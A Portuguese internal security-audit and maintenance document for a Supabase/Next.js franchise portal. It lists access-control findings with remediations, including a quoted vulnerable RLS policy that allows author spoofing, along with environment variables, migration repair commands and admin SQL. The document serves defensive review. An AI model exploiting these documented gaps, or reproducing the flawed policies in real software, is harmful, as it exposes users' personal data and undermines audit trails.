
### 11.6. 🟠 ALTO — Senhas administrativas em texto plano por SMTP

**Local:** `supabase/functions/admin_users/index.ts:272` + `supabase/functions/enviar_email_acesso/index.ts:222-306`.

**Descrição:** Os fluxos `criarUsuarioAction` e `redefinirSenhaAction` enviam a senha em **texto plano** no corpo do email via `enviar_email_acesso` (templates `criacao` e `redefinicao`). Senha trafega por SMTP (TLS), fica armazenada na inbox do destinatário indefinidamente.

**Impacto:** Vazamento por leak de inbox / forward / recovery do Gmail. Combinado com #11.1, senha vazada vira gestao com 1 PATCH.

**Remediação:** substituir por `supabase.auth.admin.generateLink({ type: 'invite' | 'recovery', email })` e enviar apenas o link de redefinição. Manter `senha_provisoria = TRUE` como gate UX. Remover o campo `senha` do payload de email.

---

### 11.7. 🟠 ALTO — Franqueado pode UPDATE livre em ticket próprio (status, prioridade, departamento, respostas)

**Local:** `supabase/migrations/20260525010000_suporte.sql` — policy `"atualiza tickets conforme escopo"`.

**Descrição:** `USING/WITH CHECK` valida que o franqueado é dono e a franquia é dele, mas não restringe colunas. Franqueado pode:
- Mudar `status` para `'resolvido'` (manipular SLA).
- Mudar `prioridade` para `'critica'` (poluir dashboard).
- Mudar `departamento_id` (escalonar para outra equipe sem aviso).
- Reescrever `respostas` (JSONB) após criação (perder auditoria).
- Gravar `zendesk_url` falso (phishing dentro do ticket).
- Apontar `responsavel_id` para qualquer perfil.

**Impacto:** Manipulação de pipeline de suporte; phishing; quebra de auditoria.

**Remediação:** trigger BEFORE UPDATE que compara OLD/NEW e rejeita alteração de colunas != `status` (com whitelist de transições válidas) quando o caller é `franqueado`. Alternativa: dropar a policy e expor RPC SECURITY DEFINER específica `reabrir_ticket(p_id)`.

---

### 11.8. 🟠 ALTO — Equipe_dm vê profiles/leituras/reações de toda a rede (sem segmentação por departamento)

**Local:** policies de SELECT em `public.profiles`, `public.franqueado_franquias`, `public.comunicado_leituras`, `public.comunicado_reacoes`.

**Descrição:** A intenção declarada no CLAUDE.md é "equipe_dm acessa por departamento". Porém, todas as policies tratam `equipe_dm` igual a `gestao` via `get_user_role() IN ('gestao','equipe_dm')`. Estagiário de Marketing lê email/nome de todos os 200+ franqueados e de todos os funcionários internos.

**Impacto:** PII espalhada lateralmente. Em caso de phishing de uma conta `equipe_dm`, atacante exfiltra a base inteira.

**Remediação:** decisão de produto. Se equipe_dm de fato deve ver tudo, manter e documentar. Se não, redesenhar:
- Restringir SELECT amplo de `profiles` apenas para `gestao`; equipe_dm vê só do próprio departamento.
- Restringir SELECT de `comunicado_leituras`/`comunicado_reacoes` apenas a `gestao` (analytics é função gerencial).

---

### 11.9. 🟠 ALTO — Auth guard inexistente (`src/proxy.ts` não executa)

**Local:** `src/proxy.ts:1-13` + `src/app/(portal)/layout.tsx:19-42`.

**Descrição:** Arquivo se chama `src/proxy.ts`, mas Next.js só executa middleware se for `src/middleware.ts`. Resultado: nenhum middleware ativo. `(portal)/layout.tsx` quando sem user **renderiza "Sem perfil"** ao invés de `redirect('/login')`. Rotas admin (`/admin/usuarios`, `/admin/calendarios`) acessíveis sem sessão no SSR — protegidas só pelo RLS retornando vazio.

**Impacto:** Falhas futuras de RLS vazam direto sem segunda camada. Sem refresh automático server-side de JWT. UX ruim.

**Remediação:** renomear para `src/middleware.ts`, instanciar `createServerClient` com cookie bridge, `auth.getUser()` + `redirect('/login')` em rotas `(portal)/*`. Em `(portal)/layout.tsx` trocar "Sem perfil" por `redirect('/login')`.

---

### 11.10. 🟡 MÉDIO — Franqueado vê tickets de OUTROS franqueados da mesma franquia

**Local:** policy `"ve tickets conforme escopo"` em `public.tickets`.

**Descrição:** Para `franqueado`, condição é `franquia_id = ANY(get_user_franquia_ids())` — não compara com `franqueado_id`. Se uma franquia tem múltiplos usuários (sócio + gerente), todos leem todos os tickets — incluindo `respostas` (JSONB com potencial PII: CPF, dados bancários no depto Financeiro, foto de RG no depto Acessos), thread pública e anexos não-internos.

**Impacto:** Vazamento horizontal dentro da franquia. Cenários sensíveis: disputa trabalhista no Jurídico visível ao próprio objeto da disputa.

**Remediação:** decisão de produto:
- Se cada franqueado deve ver só os tickets que abriu: alterar policy para `... OR (get_user_role() = 'franqueado' AND franqueado_id = auth.uid())`.
- Se regra é por franquia mas com privacidade opt-in: adicionar `tickets.privado BOOLEAN DEFAULT FALSE` filtrando por dono.

---

### 11.11. 🟡 MÉDIO — `ticket_mensagens` permite spoofing de autor por staff

**Local:** policy `"insere mensagem conforme escopo"` em `public.ticket_mensagens`.

**Descrição:**

```sql
WITH CHECK (
  pode_responder_ticket(ticket_id)
  AND origem = 'portal'
  AND (
    get_user_role() IN ('gestao','equipe_dm')  -- ← ramo sem autor_id = auth.uid()
    OR (get_user_role() = 'franqueado' AND autor_id = auth.uid() AND interna = FALSE)
  )
)
```

Para `gestao`/`equipe_dm`, não há checagem de `autor_id = auth.uid()`. Equipe_dm pode publicar mensagem assinando como outro colega.

**Impacto:** Comprometimento de trilha de auditoria interna.

**Remediação:** mover `autor_id = auth.uid()` para fora do OR:

```sql
WITH CHECK (
  pode_responder_ticket(ticket_id)
  AND origem = 'portal'
  AND autor_id = auth.uid()
  AND (
    get_user_role() IN ('gestao','equipe_dm')
    OR (get_user_role() = 'franqueado' AND interna = FALSE)
  )
)
```

---

### 11.12. 🟡 MÉDIO — `ticket_anexos` permite vincular anexo a mensagem alheia

**Local:** policy `"insere anexo conforme escopo"` em `public.ticket_anexos`.

**Descrição:** WITH CHECK apenas valida `pode_responder_ticket(ticket_id)`. Não valida que `mensagem_id` pertence ao mesmo ticket nem que foi escrita pelo invocador. Franqueado pode anexar arquivo apontando para mensagem interna de staff.

**Remediação:**

```sql
WITH CHECK (
  pode_responder_ticket(ticket_id)
  AND (
    mensagem_id IS NULL
    OR EXISTS (
      SELECT 1 FROM public.ticket_mensagens m
      WHERE m.id = mensagem_id
        AND m.ticket_id = ticket_anexos.ticket_id
        AND m.autor_id = auth.uid()
    )
  )
)
```

---

### 11.13. 🟡 MÉDIO — Logout falso (não chama `signOut`)

**Local:** `src/components/layout/Sidebar.tsx:60-62`.

**Descrição:** Botão "Sair da conta" só faz `router.push('/login')`. Não invalida cookie. Em máquina compartilhada (balcão de loja), próximo user continua logado.

**Remediação:** criar Server Action `signOutAction` que chama `supabase.auth.signOut()` + invalida cookies. No client:

```typescript
async function handleSair() {
  await signOutAction();
  router.replace("/login");
  router.refresh();
}
```

---

### 11.14. 🟡 MÉDIO — Cliente controla `role` e `payload` ao inserir em `analytics.fct_eventos`

**Local:** policy de INSERT em `analytics.fct_eventos`.

**Descrição:** WITH CHECK só valida `user_id = auth.uid()`. Cliente controla `evento`, `role` (atacante marca tudo como gestao), `payload` (estrutura arbitrária). Sem rate limit no banco.

**Impacto:** Poluição do data warehouse; potencial DOS de storage.

**Remediação:** trigger BEFORE INSERT que sobrescreve `role` com `(SELECT role FROM profiles WHERE id = auth.uid())` ignorando o que o cliente mandou. Validar evento contra whitelist (catálogo). Limitar `pg_column_size(payload) < 8192`.

---

## 12. Riscos sutis (baixa / informativa)

| # | Achado | Local | Resumo |
|---|---|---|---|
| 12.1 | Policies FOR UPDATE sem WITH CHECK | franquias, comunicados, materiais, links_atalhos, faq_*, calendario_eventos | Permite UPDATE mover linha "para fora" do escopo; adicionar WITH CHECK idêntico ao USING |
| 12.2 | Policies FOR ALL sem WITH CHECK bloqueiam INSERT | franqueado_franquias, materiais_pastas, materiais, faq_*, links_atalhos, calendario_eventos | INSERT por gestao falha via authenticated — força uso de service role |
| 12.3 | Bucket `comunicados`: INSERT não valida UUID existente | storage.objects | Permite arquivos órfãos; adicionar EXISTS check |
| 12.4 | `comunicado_leituras` sem policy DELETE | LGPD-leve | Inconsistente com `comunicado_reacoes` que tem |
| 12.5 | FKs `criado_por` sem ON DELETE | comunicados, materiais, materiais_pastas, calendario_eventos, faq_perguntas | Default NO ACTION bloqueia delete de user |
| 12.6 | `profiles.email` sem UNIQUE / sem CHECK formato | profiles | Permite duplicatas e drift com `auth.users.email` |
| 12.7 | `ticket_mensagens.autor_externo` TEXT livre | suporte | Webhook Zendesk pode vazar email institucional do atendente |
| 12.8 | `ticket_mensagens.interna` default FALSE (pública) | suporte | Erro humano expõe nota interna; considerar default TRUE para staff via trigger |
| 12.9 | `notificar_email` default TRUE em comunicados | comunicados | Rascunhos disparam email — risco de DoS de SMTP |
| 12.10 | `console.error` cru em ComunicadoForm | client | Loga form completo via remote debug / extensão |
| 12.11 | `mockUser` com email real no bundle | mock-data.ts | PII de funcionário no JS público; trocar para `usuario.exemplo@dm.local` |
| 12.12 | Race no INSERT de calendário duplicado | admin/calendarios/actions | SELECT-then-INSERT em vez de tratar 23505 |
| 12.13 | `tg_set_updated_at` sem REVOKE EXECUTE | triggers | Chamável via RPC; superfície marginal |
| 12.14 | Funções SECURITY DEFINER com `search_path = public` | helpers | Padrão correto seria `search_path = ''` (como `comunicado_id_de_path`) |
| 12.15 | Conteúdo livre sem CHECK de tamanho | conteudo_html, ticket_mensagens.conteudo, respostas JSONB | DoS via payload gigante |
| 12.16 | Sem auditoria de mudança de role | profiles | Não há `audit_log` table; mudança via UPDATE não deixa rastro |
| 12.17 | FKs apontam ora para `auth.users` ora para `profiles` | schema | Inconsistência de manutenção |
| 12.18 | Service role residual em `ativar_calendario` chamando `get_user_role` revogado | calendarios | Dissonância: REVOKE deveria quebrar, mas funciona — investigar GRANT residual |
| 12.19 | GRANTs implícitos do Supabase não auditados | schema todo | RLS é única camada — se alguém der ALTER TABLE DISABLE RLS, expõe tudo |
| 12.20 | PII em logs Edge Function (`destino_dominio`) | admin_users | Frequência + dominio em log indexado perfila base; remover |

---

## 13. Variáveis de ambiente

### 13.1. Públicas (browser-safe)

`.env.local`, expostas no bundle:

| Variável | Conteúdo | Onde |
|---|---|---|
| `NEXT_PUBLIC_SUPABASE_URL` | `https://<projeto>.supabase.co` | Client + Server |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Chave `sb_publishable_*` | Client + Server |

Toda variável com prefixo `NEXT_PUBLIC_` vai parar no bundle compilado — é segura por design (RLS protege os dados).

### 13.2. Privadas (NUNCA no navegador)

Vivem apenas em Edge Functions ou servidor:

| Variável | Onde | Uso |
|---|---|---|
| `SUPABASE_SERVICE_ROLE_KEY` | Edge Functions (Deno) | Bypass de RLS para operações admin |
| `SMTP_HOST` | Edge `enviar_email_acesso` | `smtp.gmail.com` ou `smtp-relay.gmail.com` |
| `SMTP_PORT` | Edge `enviar_email_acesso` | 587 |
| `SMTP_USER` | Edge `enviar_email_acesso` | Conta dedicada `@deliverymuch.com.br` |
| `SMTP_PASSWORD` | Edge `enviar_email_acesso` | App Password de 16 dígitos do Google |
| `SMTP_FROM` | Edge `enviar_email_acesso` | Remetente exibido |
| `APP_URL` | Edge `enviar_email_acesso` | URL canônica do portal |

### 13.3. Convenções

- `.env.local` está em `.gitignore` (junto com `briefing*.md`, `*-briefing.md`, `notes-pessoais*`, gravações `.mov`).
- **Nunca** rodar `git add .` ou `git add -A` — a raiz contém arquivos pessoais não versionáveis.
- Rotacionar a service role key se vazar (Project Settings → API → Reset).
- Secrets de Edge Function são gerenciados via Dashboard → Edge Functions → Secrets, ou `supabase secrets set`.

---

## 14. Manutenção contínua

### 14.1. Quando atualizar este documento

- Toda nova migration aplicada → atualizar §4 (schema), §5 (matriz), §10.3 (mock-first se mudou estado de migração de módulo).
- Toda nova Edge Function → atualizar §2.2, §7 (se mexe em auth/email), §13 (variáveis novas).
- Achado de §11 remediado → mover para CHANGELOG, remover daqui (ou marcar resolvido com data).
- Mudança de roles ou departamentos → §3.

### 14.2. Quando regenerar tipos

Sempre que o schema mudar, regenerar o tipo `Database` em `src/lib/types.ts`:

```bash
supabase gen types typescript --project-id gplxnzgsculryjykbcuo --schema public,analytics > src/lib/types.generated.ts
# Depois mesclar manualmente com tipos de domínio em src/lib/types.ts
```

### 14.3. Checklist antes de commit

- [ ] `npx tsc --noEmit` passa
- [ ] `npm run lint` passa
- [ ] Tipo `Database` atualizado
- [ ] Mock equivalente em `src/lib/mock-data.ts` bate com o schema
- [ ] RLS testado para as 3 roles
- [ ] Migration nova tem reversão pensada
- [ ] Segredos só em env (nada de hardcode)
- [ ] Logs sem PII
- [ ] Página frontend que consome ajustada

### 14.4. Tracking de migrations dessincronizado

⚠️ **Estado atual:** o `initial_schema` (`20260505000000`) foi aplicado **fora do tracking** — só os 2 arquivos de Comunicados aparecem em `supabase_migrations.schema_migrations`. **Antes de qualquer `supabase db push`**, consolidar:

```bash
# Marcar como aplicadas as migrations que JÁ estão no banco real
supabase migration repair --status applied 20260505000000
supabase migration repair --status applied 20260525000000
supabase migration repair --status applied 20260525010000
supabase migration repair --status applied 20260528000000
supabase migration repair --status applied 20260528010000
supabase migration repair --status applied 20260528020000
supabase migration repair --status applied 20260528030000

# Verificar
supabase migration list
```

### 14.5. Advisors abertos

- 3× INFO: `evento_franquias`, `link_franquias`, `material_franquias` têm RLS sem policy (ver §11.5).
- 1× WARN: Leaked Password Protection desligada (Dashboard → Authentication → Providers → Email → Leaked Password Protection).

### 14.6. Roadmap backend

- **Próximo passo de Comunicados:** Edge Function de notificação por e-mail (Gmail SMTP do Workspace DM) — passo 10 do roadmap. Decisão de maio/2026 documentada.
- **Suporte:** form builder em `/admin/suporte/departamentos`, tela de detalhe do ticket, RLS migration, integração Zendesk (passos 2–5 em `docs/modulo-suporte.md`).
- **Fase 2:** Ocorrências, Checklists, NPS, Health Score, Dashboard de gestão.

---

## Apêndice A: Comandos SQL úteis

### A.1. Promover usuário a `gestao`

```sql
UPDATE public.profiles
SET role = 'gestao', departamento = NULL, updated_at = NOW()
WHERE email = 'fulano@deliverymuch.com.br';
```

### A.2. Listar todos os usuários e roles

```sql
SELECT p.id, p.nome, p.email, p.role, p.departamento, p.ativo,
       u.last_sign_in_at, u.banned_until
FROM public.profiles p
JOIN auth.users u ON u.id = p.id
ORDER BY p.role, p.nome;
```

### A.3. Franquias visíveis para um franqueado

```sql
SELECT f.id, f.nome, f.cidade, f.estado
FROM public.franquias f
JOIN public.franqueado_franquias ff ON ff.franquia_id = f.id
WHERE ff.user_id = '<user_id>'
ORDER BY f.estado, f.cidade;
```

### A.4. Visão consolidada de quem é quem na rede

```sql
SELECT
  p.role,
  p.departamento,
  COUNT(*) AS total,
  COUNT(*) FILTER (WHERE p.ativo) AS ativos,
  COUNT(*) FILTER (WHERE u.banned_until IS NOT NULL) AS bloqueados,
  COUNT(*) FILTER (WHERE u.last_sign_in_at > NOW() - INTERVAL '30 days') AS logaram_30d
FROM public.profiles p
JOIN auth.users u ON u.id = p.id
GROUP BY p.role, p.departamento
ORDER BY p.role, p.departamento;
```

### A.5. Smoke test de analytics

```sql
-- Eventos hoje, por evento
SELECT evento, role, COUNT(*) AS qtd
FROM analytics.fct_eventos
WHERE ocorreu_em > NOW() - INTERVAL '1 day'
GROUP BY evento, role
ORDER BY qtd DESC;

-- Top usuários por volume
SELECT user_id, COUNT(*) AS eventos
FROM analytics.fct_eventos
WHERE ocorreu_em > NOW() - INTERVAL '7 days'
GROUP BY user_id
ORDER BY eventos DESC
LIMIT 20;
```

### A.6. Auditoria — quem é gestão

```sql
SELECT id, nome, email, created_at FROM public.profiles
WHERE role = 'gestao'
ORDER BY created_at;
```

### A.7. Tickets sem responsável atribuído

```sql
SELECT t.codigo, t.assunto, t.prioridade, t.status, d.nome AS departamento,
       t.created_at, p.nome AS franqueado, f.nome AS franquia
FROM public.tickets t
JOIN public.departamentos_suporte d ON d.id = t.departamento_id
JOIN public.profiles p ON p.id = t.franqueado_id
JOIN public.franquias f ON f.id = t.franquia_id
WHERE t.responsavel_id IS NULL
  AND t.status != 'resolvido'
ORDER BY
  CASE t.prioridade
    WHEN 'critica' THEN 1 WHEN 'alta' THEN 2 WHEN 'normal' THEN 3 WHEN 'baixa' THEN 4
  END,
  t.created_at;
```

### A.8. Verificar policies de uma tabela

```sql
SELECT polname, polcmd, pg_get_expr(polqual, polrelid) AS using_expr,
       pg_get_expr(polwithcheck, polrelid) AS with_check_expr
FROM pg_policy
WHERE polrelid = 'public.profiles'::regclass;
```

### A.9. Limpar tudo de um usuário (preparação para DELETE em auth.users)

```sql
UPDATE public.comunicados        SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.materiais          SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.materiais_pastas   SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.calendario_eventos SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.faq_perguntas      SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
DELETE FROM auth.users WHERE id = '<user_id>';
```

---

## Apêndice B: Glossário

| Termo | Definição |
|---|---|
| **`franqueado`** | Role do lojista da rede. Vê apenas dados das franquias vinculadas via `public.franqueado_franquias`. |
| **`equipe_dm`** | Role do funcionário interno DM, segmentado por `departamento`. Lê quase tudo; gerencia conteúdo e atua no Suporte só nos departamentos onde é responsável. |
| **`gestao`** | Role máximo. Único que cria franquias, gerencia vínculos franqueado×franquia, exclui comunicados e tickets, lê `analytics.fct_eventos`. |
| **`anon`** (Supabase) | Role Postgres atribuído a requests **sem JWT**. No portal, só usado em rotas públicas e via anon key. |
| **`authenticated`** (Supabase) | Role Postgres atribuído a requests com JWT válido. É o role que todas as policies do projeto avaliam quando `auth.uid()` retorna não-nulo. |
| **`service_role`** (Supabase) | Role Postgres que **bypassa RLS**. Vive apenas em Edge Functions. **Nunca** no Next.js. |
| **RLS** (Row Level Security) | Mecanismo Postgres que aplica policies SQL por linha. Toda tabela do projeto tem RLS habilitado. |
| **`SECURITY DEFINER`** | Função que roda com privilégios do **dono**, não do invocador. Usado em helpers de RLS (`get_user_role`, `pode_ver_comunicado`) para bypass interno controlado. |
| **`SECURITY INVOKER`** | Função que roda com privilégios do **invocador**. Default. Usado em `ativar_calendario` para respeitar RLS. |
| **`auth.uid()`** | Função do Supabase Auth — retorna o UUID do usuário corrente (de `auth.users`). NULL se anon. |
| **`USING` / `WITH CHECK`** | Cláusulas de policy RLS. `USING` filtra linhas visíveis/atualizáveis ANTES; `WITH CHECK` valida o estado APÓS a operação. Para UPDATE, ambos importam. |
| **PII** | Personally Identifiable Information — dado que identifica indivíduo (nome, email, CPF). |
| **Anon key** | Chave pública JWT-assinada que identifica o projeto Supabase. Segura no client porque RLS protege. |
| **`@supabase/ssr`** | Pacote que faz a ponte entre Supabase Auth e cookies do Next.js (lê/escreve `sb-*-auth-token`). |
| **`PostgREST`** | API REST auto-gerada do Supabase (`<projeto>.supabase.co/rest/v1/*`). Aplica RLS automaticamente. |
| **Edge Function** | Função Deno deployada no edge do Supabase. Acesso opcional a service role via `Deno.env.get`. |
| **Mock-first** | Estratégia do portal: cada módulo nasce com mock em `src/lib/mock-data.ts`, migra para Supabase quando o passo do roadmap chegar. |
| **`get_user_franquia_ids()`** | Helper SECURITY DEFINER que retorna UUID[] das franquias do usuário corrente. Para `equipe_dm`/`gestao` retorna `{}` (não usado por essas roles nas policies). |
| **`pode_ver_comunicado(uuid)`** | Reúso da regra de leitura de comunicado, embutido em policies de tabelas filhas e no Storage. |
| **`eh_responsavel_departamento(uuid)`** | True se o usuário corrente está em `departamentos_responsaveis` para aquele departamento (com papel `responsavel` ou `backup`). |
| **`ativar_calendario(uuid)`** | RPC que troca atomicamente qual `calendarios_html` está ativo, contornando o partial unique index. Gate manual de role. |
| **Bucket privado** | Bucket do Storage cujo acesso exige signed URL ou chamada autenticada via API. |
| **Bucket público** | Bucket cujo conteúdo é acessível via `/object/public/{bucket}/{path}` sem auth, bypassando policies SELECT. |
| **Trigger** | Função plpgsql disparada por evento (INSERT/UPDATE/DELETE) em uma tabela. |
| **Sequence** | Gerador de inteiros sequenciais. `tickets_codigo_seq` start 8000 gera `DM-8000`, `DM-8001`, etc. |
| **Migration tracking** | `supabase_migrations.schema_migrations` rastreia quais arquivos `supabase/migrations/*.sql` foram aplicados. **Dessincronizado** no projeto atual (ver §14.4). |
| **Advisor** | Recomendação automática do Supabase (INFO/WARN/ERROR) sobre configuração. Visível no Dashboard. |
| **DM-XXXX** | Formato do código de ticket. Gerado por trigger BEFORE INSERT em `tickets`. |
